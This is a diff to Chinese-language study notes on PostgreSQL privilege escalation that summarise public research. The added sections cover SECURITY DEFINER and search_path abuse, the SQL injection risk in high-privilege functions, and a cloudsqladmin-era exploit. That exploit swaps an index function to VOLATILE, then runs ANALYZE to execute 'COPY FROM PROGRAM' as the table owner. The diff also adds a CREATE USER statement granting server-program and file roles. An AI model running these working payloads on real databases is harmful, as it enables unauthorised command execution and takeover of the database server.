@@ -6,6 +6,8 @@ https://www.cybertec-postgresql.com/en/abusing-security-definer-functions/
 
 https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc/
 
+https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql
+
 ## docker创建环境
 
 ```
@@ -14,7 +16,7 @@ docker pull postgres:10.0
 docker run --name my_postgres -e POSTGRES_PASSWORD=123456 -d -p 5432:5432 postgres:10.0
 ```
 
-## 第一篇文章总结
+## 高权限自定义函数问题
 
 创建危险函数
 
@@ -51,7 +53,7 @@ search_path的意思是 先去public寻找函数harmless函数
 
 运行harmless时是高权限账号 导致INSERT INTO public.t1 VALUES (current_user);插入的是高权限账号
 
-## 第二篇文章总结
+## 触发器漏洞
 
 整体流程
 
@@ -114,3 +116,71 @@ CREATE CONSTRAINT TRIGGER def
 ALTER TABLE blah SET (autovacuum_vacuum_threshold = 1);
 ALTER TABLE blah SET (autovacuum_analyze_threshold = 1);
 ```
+
+### SQL注入 高权限创建的函数
+
+高权限创建的函数
+
+![QQ_1732160674745](https://github.com/user-attachments/assets/8cf643e5-35ed-4f6e-9856-aad0b3d5c054)
+
+低权限执行
+
+![QQ_1732160720976](https://github.com/user-attachments/assets/35974216-ded7-4977-a72d-54795fb5a617)
+
+实际是高权限执行的是
+
+```
+INSERT INTO public.test3(data) VALUES(current_user);
+```
+
+### postgresql用户组
+
+可以将表的owner给用户组
+
+创建一个索引函数
+
+然后执行刷新 触发索引
+
+身份变为用户组
+
+```
+CREATE TABLE temp_table (data text); 
+CREATE TABLE shell_commands_results (data text); 
+ 
+INSERT INTO temp_table VALUES ('dummy content'); 
+ 
+/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */ 
+CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text 
+  LANGUAGE sql IMMUTABLE AS 'select ''nothing'';'; 
+ 
+CREATE INDEX index_malicious ON public.temp_table (suid_function(data));
+
+/*
+自己要在cloudsqladmin里面
+*/
+ 
+ALTER TABLE temp_table OWNER TO cloudsqladmin;
+ 
+/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */ 
+CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text 
+  LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';'; 
+ 
+ANALYZE public.temp_table; 
+
+```
+
+### grant权限提权
+
+直接创建一个有权限的用户
+
+pg_read_server_files
+pg_write_server_files
+pg_execute_server_program
+
+```
+CREATE USER james CREATEDB IN GROUP 
+  pg_read_server_files,
+  pg_write_server_files,
+  pg_execute_server_program ROLE postgres;
+```
+
